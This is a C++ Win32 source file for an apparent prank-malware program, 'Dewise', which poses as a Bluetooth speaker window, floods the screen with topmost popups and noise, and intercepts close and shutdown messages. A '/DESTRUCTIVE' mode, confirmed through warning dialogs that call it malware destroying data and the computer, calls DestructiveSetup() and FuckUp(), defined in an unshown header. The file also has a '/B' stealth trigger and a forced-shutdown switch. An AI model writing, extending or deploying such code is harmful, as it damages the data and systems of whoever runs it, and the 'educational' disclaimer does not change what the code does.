/*
* 
* Dewise.cpp : Defines the entry point for the application.
* Created in 2025-11-07
* Version 2.1 Build Around 500 (including debug, I'm no longer sure how many times I built this solution)
* Created by @0x0-nyan
* 
*/

#include "framework.h"
#include "Dewise.h"
#include "common.h"
#include "payloads.h"
#define MAX_LOADSTRING 100
#define TASK_BTSTACK 0
#define TASK_MUSIC 1
#define TASK_FM 2
#define TASK_LINEIN 3

// Global Variables:
WCHAR szTitle[MAX_LOADSTRING];                  // The title bar text
WCHAR szWindowClass[MAX_LOADSTRING];            // the main window class name
BOOLEAN MSG_MODE_BTN_DOWN = FALSE;
BOOLEAN MSG_CHANGE_WORKMODE = FALSE;
BOOLEAN MSG_POWER_OFF = FALSE;
BOOLEAN MSG_NEXT_TRACK = FALSE;
BOOLEAN IsDestructive = FALSE;
BOOLEAN LED_ON = FALSE;
int MSG_WORKMODE = 0;
signed int LED_INTERVAL = 0;
HINSTANCE hInst;
HBITMAP hLED_OFF;
HBITMAP hLED_ON;
HBITMAP hPopupBmps[10];
HWND hWnds[51];

// Forward declarations of functions included in this code module:
BOOL                InitInstance(HINSTANCE, int);
LRESULT CALLBACK    WndProc(HWND, UINT, WPARAM, LPARAM);
LRESULT CALLBACK    PopupProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK    About(HWND, UINT, WPARAM, LPARAM);
int WINAPI TaskBTStack();
int WINAPI TaskMusic();
int WINAPI TaskFM();
int WINAPI TaskLineIn();
int WINAPI InitPopups(LPVOID);


int WINAPI LEDProc() {
	HDC hdc;
    HDC hMemDC;
    RECT RectLED = {
        377,
        20,
        387,
        30
    };

    while (1) {
		switch (LED_INTERVAL) {
        case 0:
            LED_ON = FALSE;
            InvalidateRect(hWnds[0], &RectLED, FALSE);
            while (LED_INTERVAL == 0) {
                Sleep(100);
            }
            break;

        case -1:
            LED_ON = TRUE;
            InvalidateRect(hWnds[0], &RectLED, FALSE);
            while (LED_INTERVAL == -1) {
                Sleep(100);
            }
            break;

        default:
            if (LED_INTERVAL == 0 || LED_INTERVAL == -1) break;
            LED_ON = TRUE;
            InvalidateRect(hWnds[0], &RectLED, FALSE);
            Sleep(LED_INTERVAL);
			if (LED_INTERVAL == 0 || LED_INTERVAL == -1) break;
            LED_ON = FALSE;
            InvalidateRect(hWnds[0], &RectLED, FALSE);
            Sleep(LED_INTERVAL);
            break;
		}

        ReleaseDC(hWnds[0], hdc);
        DeleteDC(hMemDC);
        
    }
    return 0;
}


int WINAPI TaskBTStack() {
    MSG_WORKMODE = TASK_BTSTACK;
    LED_INTERVAL = 250;
    WAVE EMI;
    EMI.Init(25600);
	char* buffer = new char[32768];
    for (int t = 0; t < 32768; t++)
		buffer[t] = static_cast<char>(127 ^ (t / (t % 2 ? 4 : 8) | t / (t % 32 ? 8 : 128)) % 2);    //This Bytebeat formula simulates Bluetooth interference (EMI)
	EMI.Play(buffer, 32768, 160);
    PlaySoundW(MAKEINTRESOURCEW(BPF_DISCONNECT_WAV), NULL, SND_RESOURCE | SND_ASYNC);
    for (int i = 0; i <= 35; i++) {
        if ((MSG_CHANGE_WORKMODE == TRUE) || (MSG_POWER_OFF == TRUE)) {
            EMI.Kill();
            delete[] buffer;
            MSG_CHANGE_WORKMODE = FALSE;
            return 0;
        }
        Sleep(100);
    }
    PlaySoundW(MAKEINTRESOURCEW(BPF_CONNECT_WAV), NULL, SND_RESOURCE | SND_ASYNC);
    LED_INTERVAL = -1;
    while (MSG_CHANGE_WORKMODE == FALSE) {
        if (MSG_POWER_OFF == TRUE) break;
        Sleep(10);
    }
    EMI.Kill();
    delete[] buffer;
    MSG_CHANGE_WORKMODE = FALSE;
    return 0;
}

int WINAPI TaskMusic() {
    MSG_WORKMODE = TASK_MUSIC;
    PlaySoundW(MAKEINTRESOURCEW(BPF_MUSIC_WAV), NULL, SND_RESOURCE | SND_ASYNC);
    LED_INTERVAL = 1000;
    for (int i = 0; i <= 15; i++) {
        if ((MSG_CHANGE_WORKMODE == TRUE) || (MSG_POWER_OFF == TRUE)) {
            MSG_CHANGE_WORKMODE = FALSE;
            return 0;
        }
        Sleep(100);
    }
    BOOLEAN MusicAvailable = FALSE;
    WAVE Bytebeat;
    char* buffer = new char[262144];
    WCHAR pszPath[MAX_PATH];
    WCHAR command[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_MYMUSIC, NULL, SHGFP_TYPE_CURRENT, pszPath);
    WIN32_FIND_DATAW FindData = { NULL };
    SetCurrentDirectoryW(pszPath);
    HANDLE hFind = FindFirstFileW(L"*.mp3", &FindData);
    int i = 1;
    int CurTrack = 0;
    if (hFind != INVALID_HANDLE_VALUE) {
        MusicAvailable = TRUE;
        wsprintfW(command, L"open \"%s\" alias %x", FindData.cFileName, i);
        mciSendStringW(command, NULL, NULL, NULL);
        for (i = 2; FindNextFileW(hFind, &FindData); i++) {
            wsprintfW(command, L"open \"%s\" alias %x", FindData.cFileName, i);
            mciSendStringW(command, NULL, NULL, NULL);
        }
        if (GetLastError() == ERROR_NO_MORE_FILES) FindClose(hFind);
        i--;
    }

    if (MusicAvailable == TRUE) {
        CurTrack = 1;
        mciSendStringW(L"play 1 from 0 notify", NULL, NULL, hWnds[0]);
    }
    else {
        //MessageBoxW(NULL, L"MP3 Player is currently unavailable, enjoy some loud bytebeats instead!", L"Error", MB_ICONERROR | MB_OK | MB_SYSTEMMODAL);
        SYSTEMTIME st;
        GetLocalTime(&st);
        srand((unsigned int)(st.wMilliseconds + st.wSecond * 1000 + st.wMinute * 60000));
        int BBSwitch = rand() % 6;
        unsigned long Sample = 8000;
        for (long t = 0; t < 262144; t++) {
            switch (BBSwitch) {
            case 0:
                Sample = 32000;
                buffer[t] = static_cast<char>(5 * t / 4 & t / 4 >> 7 | 3 * t / 4 & 4 * t / 4 >> 10);
                break;
            case 1:
                Sample = 32000;
                buffer[t] = static_cast<char>(t / 4 * ((t / 4 & 4096 ? t / 4 % 65536 < 59392 ? 6 : t / 4 & 7 : 16) ^ (1 & t / 4 >> 14)) >> (3 & -t / 4 >> (t / 4 & 2048 ? 2 : 10)));
                break;
            case 2:
                Sample = 8000;
                buffer[t] = static_cast<char>((t >> 7 | t | t >> 6) * 10 + 4 * (t & t >> 13 | t >> 6));
                break;
            case 3:
                Sample = 11025;
                buffer[t] = static_cast<char>((((t / 10 | 0) ^ (t / 10 | 0) - 1280) % 11 * t / 2 & 127) + (((t / 640 | 0) ^ (t / 640 | 0) - 2) % 13 * t / 2 & 127));
                break;
            case 4:
                Sample = 44100;
                buffer[t] = static_cast<char>(((t / 4 * ((t >> 12 ^ (t >> 12) - 2) % 11) | t >> 13) & 127) + (t / 12 * (0x98646363 >> (t >> 11 & 28) & 15) & 128));
                break;
            case 5:
                Sample = 8000;
                buffer[t] = static_cast<char>(t * (t & 16384 ? 7 : 5) * (5 - (3 & t >> 8)) >> (3 & -t >> (t & 4096 ? 2 : 16)) | t >> (t & 8192 ? t & 4096 ? 4 : 4 : 3));
                break;
            }
        }
        Bytebeat.Init(Sample);
        Bytebeat.Play(buffer, 262144, 32);
    }
    
    while (MSG_CHANGE_WORKMODE == FALSE) {
        if (MSG_POWER_OFF == TRUE) break;
        if (MSG_NEXT_TRACK == TRUE) {
            wsprintfW(command, L"seek \"%x\" to start", CurTrack);
            mciSendStringW(command, NULL, NULL, NULL);
            CurTrack++;
            if (CurTrack > i) CurTrack = 1;
            wsprintfW(command, L"play \"%x\" from 0 notify", CurTrack);
            mciSendStringW(command, NULL, NULL, hWnds[0]);
            MSG_NEXT_TRACK = FALSE;
        }
        Sleep(10);
    }
    Bytebeat.Kill();
    delete[] buffer;
    if (MusicAvailable == TRUE) {
        for (int t = 1; t <= i; t++) {
            wsprintfW(command, L"close \"%x\"", t);
            mciSendStringW(command, NULL, NULL, NULL);
        }
    }
    MSG_CHANGE_WORKMODE = FALSE;
	return 0;
}

int WINAPI TaskFM() {
    MSG_WORKMODE = TASK_FM;
    LED_INTERVAL = 1000;
    PlaySoundW(MAKEINTRESOURCEW(BPF_RADIO_WAV), NULL, SND_RESOURCE | SND_ASYNC);
    for (int i = 0; i <= 14; i++) {
        if ((MSG_CHANGE_WORKMODE == TRUE) || (MSG_POWER_OFF == TRUE)) {
            MSG_CHANGE_WORKMODE = FALSE;
            return 0;
        }
        Sleep(100);
    }
    WAVE Radio;
    Radio.Init(44100);
    char *buffer = new char[262144];
    for (long t = 0; t < 262144; t++)
        buffer[t] = static_cast<char>(127 ^ (rand() % 64));
	Radio.Play(buffer, 262144, 32);

    while (MSG_CHANGE_WORKMODE == FALSE) {
        if (MSG_POWER_OFF == TRUE) break;
        Sleep(10);
    }
    Radio.Kill();
    delete[] buffer;
    MSG_CHANGE_WORKMODE = FALSE;
    return 0;
}

int WINAPI TaskLineIn() {
    MSG_WORKMODE = TASK_LINEIN;
    LED_INTERVAL = 1000;
    PlaySoundW(MAKEINTRESOURCEW(BPF_LINEIN_WAV), NULL, SND_RESOURCE | SND_ASYNC);
    for (int i = 0; i <= 16; i++) {
        if ((MSG_CHANGE_WORKMODE == TRUE) || (MSG_POWER_OFF == TRUE)) {
            MSG_CHANGE_WORKMODE = FALSE;
            return 0;
        }
        Sleep(100);
    }
    WAVE AUX;
    AUX.Init(25600);
    char* buffer = new char[262144];
    for (DWORD t = 0; t < 262144; t++)
        buffer[t] = static_cast<char>(127 ^ (4 & t / 64));     //This Bytebeat formula simulates mains hum (50Hz at 25.6k, 60Hz at 30.72k sample rate)
    AUX.Play(buffer, 262144, 32);

    while (MSG_CHANGE_WORKMODE == FALSE) {
        if (MSG_POWER_OFF == TRUE) break;
        Sleep(10);
    }
    AUX.Kill();
    delete[] buffer;
    MSG_CHANGE_WORKMODE = FALSE;
    return 0;
}


int WINAPI PayloadTimer(LPVOID pvIsBackground) {
    BOOLEAN IsBackground = (BOOLEAN)pvIsBackground;
    if (IsBackground == TRUE) {
        SIZE Scr;
        GetScreenSize(&Scr);
        RECT Start = {
            0,
            Scr.cy - 50,
            80,
            Scr.cy
        };

        int TriA = pow(Scr.cx / 2, 2);
        int TriB = pow(Scr.cy, 2);
        int TriC = sqrt(TriA + TriB) / 2;
        POINT Mouse;
        while (1) {
            GetCursorPos(&Mouse);
            if ((Mouse.x >= Start.left) && (Mouse.x <= Start.right) && (Mouse.y >= Start.top) && (Mouse.y <= Start.bottom)) break;
            Sleep(10);
        }

        SetWindowPos(hWnds[0], NULL, 0, Scr.cy, 0, 0, SWP_NOSIZE);
        ShowWindow(hWnds[0], SW_SHOWNORMAL);
        PlaySoundW(MAKEINTRESOURCE(BPF_POWER_UP_WAV), NULL, SND_RESOURCE | SND_ASYNC);
        for (int i = 0; i <= TriC; i++) {
            if (MSG_POWER_OFF == TRUE) return 0;
            MoveWindow(hWnds[0], (i + 16), (Scr.cy - (i + 16)), 640, 282, TRUE);
            Sleep(1);
        }
        Sleep(1000);
        LED_INTERVAL = -1;
        Sleep(500);
    }
    ShowWindow(hWnds[0], SW_SHOWNORMAL);
    Sleep(100);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TaskBTStack, NULL, 0, NULL);
    Sleep(60000);
    ShowWindow(hWnds[1], SW_SHOWNORMAL);
    PlaySoundW(MAKEINTRESOURCE(BPF_MUSIC2_WAV), NULL, SND_RESOURCE | SND_ASYNC);
    Sleep(60000);
    for (int i = 1; i <= 10; i++) {
        if (MSG_POWER_OFF == TRUE) return 0;
        //ShowWindow(hWnds[i], SW_SHOWNORMAL);
        SetWindowPos(hWnds[i], HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW);
        PlaySoundW(MAKEINTRESOURCEW(139 + i), NULL, SND_RESOURCE | SND_ASYNC);
        Sleep(1000);
    }
    PlaySoundW(MAKEINTRESOURCE(BPF_BT_WAV), NULL, SND_RESOURCE | SND_ASYNC);
    SetWindowPos(hWnds[0], HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW);
    Sleep(10000);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RandomSounds, NULL, 0, NULL);
    Sleep(10000);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)RandomDialogs, NULL, 0, NULL);
    Sleep(10000);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)BTIcons, NULL, 0, NULL);
    Sleep(10000);
    for (int i = 1; i <= 50; i++) {
        if (MSG_POWER_OFF == TRUE) return 0;
        //ShowWindow(hWnds[i], SW_SHOWNORMAL);
        SetWindowPos(hWnds[i], HWND_TOPMOST, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE | SWP_SHOWWINDOW);
        MessageBeep(MB_OK);
        Sleep(50);
    }
    Sleep(10000);
    //CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WindowShaker, NULL, 0, NULL);
	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)CrazyScreen, NULL, 0, NULL);
    Sleep(60507);
    if (IsDestructive == TRUE) {
        FuckUp();
        while (1) {
            Sleep(100);
        }
    }
    else {
        ExitProcess(0);
    }
    
    return 0;
}


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPWSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    BOOLEAN IsBackdoor = FALSE;

    // Command Line Parser
    LPWSTR* szArglist;
    int nArgs;
    szArglist = CommandLineToArgvW(lpCmdLine, &nArgs);
    if (NULL != szArglist) {
        for (int i = 0; i <= nArgs; i++) {
            if(lstrcmpi(szArglist[i], L"/B") == 0) {
                //MessageBoxW(NULL, szArglist[i], L"", MB_OK);
                IsBackdoor = TRUE;
			}

            if (lstrcmp(szArglist[i], L"/DESTRUCTIVE") == 0) {
                //MessageBoxW(NULL, szArglist[i], L"", MB_OK);
                IsDestructive = TRUE;
            }

            if (lstrcmp(szArglist[i], L"-FS") == 0) {
				LocalFree(szArglist);
                ForceShutdown();
            }
        }
    }
    // Free memory allocated for CommandLineToArgvW arguments.
    LocalFree(szArglist);
    
	// Privilege check and Destructive mode confirmation
    int MBResp = 0;
    if (IsDestructive == TRUE) {
        if (IsUserAnAdmin() == FALSE) {
            MessageBoxW(NULL, L"This program requires admin privileges to run properly.\nPlease run the application as an administrator.", L"Error", MB_OK | MB_ICONERROR);
            return FALSE;
        }
       MBResp = MessageBoxW(NULL, L"This is not an \"ACTUAL\" Bluetooth device or settings.\nIf you want to access Bluetooth settings, please click Cancel.", L"CAUTION", MB_OKCANCEL | MB_ICONINFORMATION);
        if (MBResp == IDOK) {
            MBResp = MessageBoxW(NULL, L"You are going to run a malware which destroys your data and computer.\nAre you still sure to continue?", L"WARNING", MB_YESNO | MB_ICONWARNING);
            if (MBResp == IDYES) {
                WCHAR Warning[] = L"SERIOUSLY, THIS IS THE LAST WARNING.\nTHIS PROGRAM WILL DESTROY YOUR DATA AND COMPUTER.\nIF YOU CHOOSE YES, THERE ARE NO WAYS TO STOP THIS.\n\nTHIS PROGRAM IS INTENDED FOR ENTERTAINMENT AND EDUCATIONAL PURPOSES ONLY.\nNEVER USE ANY OF THIS FOR MALICIOUS PURPOSES.\nAUTHOR IS NOT RESPONSIBLE FOR ANY DAMAGES CAUSED BY RUNNING THIS PROGRAM\n\nBY CLICKING YES, WE RECOGNISE YOU AGREED THIS WARNING.";
                MBResp = MessageBoxW(NULL, Warning, L"STOP!", MB_YESNO | MB_ICONERROR);
                if (MBResp == IDYES) {
                    DestructiveSetup(hInstance);
                }
            }
        }
    }
    if (MBResp == IDCANCEL || MBResp == IDNO) return FALSE;
    
    // Initialize global strings
    LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING);
    LoadStringW(hInstance, IDC_DEWISE, szWindowClass, MAX_LOADSTRING);
    
    WNDCLASSEXW wcex;
    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_CLASSDC;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_DEWISE));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = NULL;
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
    RegisterClassExW(&wcex);

    // Perform application initialization:
    if (!InitInstance(hInstance, nCmdShow)) return FALSE;

    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)InitPopups, (LPVOID)hInstance, 0, NULL);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)LEDProc, NULL, 0, NULL);
    CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PayloadTimer, (LPVOID)IsBackdoor, 0, NULL);
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
            //TranslateMessage(&msg);
            DispatchMessageW(&msg);
    }
    MessageBeep(MB_ICONERROR);
    // Return the exit code to the system if an error occurred. 
    return msg.wParam;
}


int WINAPI InitPopups(LPVOID lpvInstance) {
    HINSTANCE hInstance = (HINSTANCE)lpvInstance;
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_CLASSDC;
    wcex.lpfnWndProc = PopupProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_DEWISE));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = NULL;
    wcex.lpszClassName = L"PopupClass";
    wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL));
    RegisterClassExW(&wcex);
    
    SYSTEMTIME st;
    GetLocalTime(&st);
    SIZE Scr;
    GetScreenSize(&Scr);
    srand((unsigned int)(st.wMilliseconds + st.wSecond * 1000 + st.wMinute * 60000));
    int wx, wy;
    for (int i = 1; i <= 50; i++) {
        wx = (rand() % Scr.cx - 300);
        wy = (rand() % Scr.cy - 400);
        if (wx < 0) wx = rand() % 400;
        if (wy < 0) wy = rand() % 400;
        hWnds[i] = CreateWindowExW(
            WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
            L"PopupClass",
            i <= 10 ? L"Music" : L"THA DEWISE",
            WS_POPUP | WS_CAPTION | WS_BORDER | (i <= 10 ? WS_SYSMENU : 0),
            wx,      //X position
            wy,      //Y position
            320,                         //X size
            350,                         //Y size
            nullptr,
            nullptr,
            hInstance,
            nullptr);
        ShowWindow(hWnds[i], SW_HIDE);
    }

    if (!hWnds[1]) {
        DWORD dwError = GetLastError();
        WCHAR ErrMsg[256];
        wsprintfW(ErrMsg, L"Failed to initialize popup window\n%x", dwError);
        MessageBoxW(NULL, ErrMsg, L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
        ExitProcess(0);
    }
    MSG msg;
    while (GetMessageW(&msg, NULL, 0, 0)) {
            //TranslateMessage(&msg);
            DispatchMessageW(&msg);
    }

    DWORD dwError = GetLastError();
    WCHAR ErrMsg[256];
    wsprintfW(ErrMsg, L"An error occurred in message loop\n%x", dwError);
    MessageBoxW(NULL, ErrMsg, L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
    ExitProcess(msg.wParam);

}

//
//   FUNCTION: InitInstance(HINSTANCE, int)
//
//   PURPOSE: Saves instance handle and creates main window
//
//   COMMENTS:
//
//        In this function, we save the instance handle in a global variable and
//        create and display the main program window.
//
BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
   hInst = hInstance; // Store instance handle in our global variable
   hLED_OFF = LoadBitmapW(hInst, MAKEINTRESOURCE(X6_BLACK_OFF));
   hLED_ON = LoadBitmapW(hInst, MAKEINTRESOURCE(X6_BLACK_ON));
   for (int i = 0; i < 10; i++) {
       hPopupBmps[i] = LoadBitmapW(hInst, MAKEINTRESOURCE(175 + i));
   }

   hWnds[0] = CreateWindowExW(
                             WS_EX_TOPMOST,
                             szWindowClass,
                             szTitle,
                             WS_POPUP,
                             (GetSystemMetrics(SM_CXSCREEN) - 640) / 2,                    //X position
                             (GetSystemMetrics(SM_CYSCREEN) - 282) / 2,                    //Y position
                             640,                   //X size
                             282,                   //Y size
                             nullptr,
                             nullptr,
                             hInstance,
                             nullptr);

   if (!hWnds[0])
   {
       DWORD dwError = GetLastError();
       WCHAR ErrMsg[256];
       wsprintfW(ErrMsg, L"Failed to initialize application instance.\n%x", dwError);
       MessageBoxW(NULL, ErrMsg, L"ERROR", MB_ICONERROR | MB_SYSTEMMODAL);
       return FALSE;
   }
   ShowWindow(hWnds[0], SW_HIDE);
   HRGN hRegion = CreateEllipticRgn(26, 0, 637, 244);
   SetWindowRgn(hWnds[0], hRegion, TRUE);
   return TRUE;
}

//
//  FUNCTION: WndProc(HWND, UINT, WPARAM, LPARAM)
//
//  PURPOSE: Processes messages for the main window.
//
//  WM_COMMAND  - process the application menu
//  WM_PAINT    - Paint the main window
//  WM_DESTROY  - post a quit message and return
//
//
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {

    case WM_PAINT:
    {
        PAINTSTRUCT ps;
        HDC hdc = BeginPaint(hWnds[0], &ps);
        HDC hMemDC = CreateCompatibleDC(hdc);
        if (LED_ON == FALSE) {
            SelectObject(hMemDC, hLED_OFF);
        }
        else {
            SelectObject(hMemDC, hLED_ON);
        }
        //BitBlt(hdc, 0, 0, 640, 282, hMemDC, 0, 0, SRCCOPY);
        BitBlt(hdc, ps.rcPaint.left, ps.rcPaint.top, ps.rcPaint.right - ps.rcPaint.left, ps.rcPaint.bottom - ps.rcPaint.top, hMemDC, ps.rcPaint.left, ps.rcPaint.top, SRCCOPY);
        EndPaint(hWnds[0], &ps);
        DeleteDC(hMemDC);
        return 0;
    }

    case WM_CLOSE:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerOff, NULL, 0, NULL);
        return 0;

    case WM_QUIT:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerOff, NULL, 0, NULL);
        return 0;

    case WM_QUERYENDSESSION:
        CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)PowerOff, NULL, 0, NULL);
        return 0;

    case WM_LBUTTONDOWN: {
        if (wParam == MK_LBUTTON) {
            // Get Mode Button Position
            RECT ADKEY = { 0 };
            GetWindowRect(hWnds[0], &ADKEY);
            ADKEY.left += 355;
            ADKEY.right = ADKEY.left + 388;
            ADKEY.top += 3;
            ADKEY.bottom = ADKEY.top + 10;

            // Get Cursor Position for Mode Button
            POINT Mouse;
            GetCursorPos(&Mouse);
            if ((Mouse.x >= ADKEY.left) && (Mouse.x <= ADKEY.right) && (Mouse.y >= ADKEY.top) && (Mouse.y <= ADKEY.bottom)) {
                MSG_MODE_BTN_DOWN = TRUE;
            }
            else {
                MSG_MODE_BTN_DOWN = FALSE;
                ReleaseCapture();
                PostMessageW(hWnds[0], WM_NCLBUTTONDOWN, HTCAPTION, 0);
            }
        }
        return 0;
    }

    case WM_LBUTTONUP: {
        if (MSG_MODE_BTN_DOWN == TRUE) {          //Task Manager
            MSG_CHANGE_WORKMODE = TRUE;
            MSG_MODE_BTN_DOWN = FALSE;
            switch (MSG_WORKMODE) {
            case TASK_BTSTACK:
                while (MSG_CHANGE_WORKMODE == TRUE) {
                    Sleep(5);
                }
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TaskMusic, NULL, 0, NULL);
                break;
            case TASK_MUSIC:
                while (MSG_CHANGE_WORKMODE == TRUE) {
                    Sleep(5);
                }
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TaskFM, NULL, 0, NULL);
                break;
            case TASK_FM:
                while (MSG_CHANGE_WORKMODE == TRUE) {
                    Sleep(5);
                }
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TaskLineIn, NULL, 0, NULL);
                break;
            case TASK_LINEIN:
                while (MSG_CHANGE_WORKMODE == TRUE) {
                    Sleep(5);
                }
                CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TaskBTStack, NULL, 0, NULL);
                break;
            }
        }
        //else PostMessageW(hWnds[0], WM_NCLBUTTONUP, HTCAPTION, lParam);
        return 0;
    }

    case MM_MCINOTIFY:
        if (wParam == MCI_NOTIFY_SUCCESSFUL) MSG_NEXT_TRACK = TRUE;
        return 0;

    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    //return 0;
}

LRESULT CALLBACK PopupProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam) {
    switch (message) {
    case WM_PAINT: {        // { } are used to avoid C2361
        int i = 1;
        int p = 0;
        HDC hdc;
        HDC hMemDC;
        PAINTSTRUCT ps;
        for (i = 1; i <= 50; i++) {
            if (hWnd == hWnds[i]) {
                p = i % 10;
                if (p == 0) p = 9; else p--;
                break;
            }
        }

        hdc = BeginPaint(hWnds[i], &ps);
        hMemDC = CreateCompatibleDC(hdc);
        SelectObject(hMemDC, hPopupBmps[p]);
        BitBlt(hdc, ps.rcPaint.left, ps.rcPaint.top, ps.rcPaint.right - ps.rcPaint.left, ps.rcPaint.bottom - ps.rcPaint.top, hMemDC, ps.rcPaint.left, ps.rcPaint.top, SRCCOPY);
        EndPaint(hWnds[i], &ps);
        DeleteDC(hMemDC);
        break;
    }

    case WM_CLOSE: {
        if (hWnd == hWnds[8]) {
            MoveWindow(hWnds[8], RandScreenX(0), RandScreenY(0), 320, 350, TRUE);
            MessageBeep(MB_OK);
            break;
        }
        ShowWindow(hWnd, SW_HIDE);
        break;
    }

    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

